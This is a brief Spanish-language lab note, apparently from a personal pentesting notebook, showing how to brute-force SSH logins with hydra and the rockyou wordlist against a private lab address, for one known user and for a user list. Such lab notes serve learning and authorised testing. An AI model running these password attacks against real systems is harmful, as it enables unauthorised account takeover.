Supongamos que conocemos un usuario de sistema, por ejemplo **balutin**, pero no conocemos su contraseña. Haciendo uso de `hydra`, podemos hacer fuerza bruta:

![[Pasted image 20250715191028.png]]

```
hydra -l balutin -P /usr/share/SecLists/rockyou.txt ssh://172.17.0.3 -t 64
```

![[Pasted image 20250715191109.png]]

![[Pasted image 20250715191230.png]]

En caso de que tengamos una lista de usuarios podemos ejecutar el comando de la siguiente manera:

```
hydra -L users.txt -P /usr/share/SecLists/rockyou.txt ssh://172.17.0.3 -t 64
```

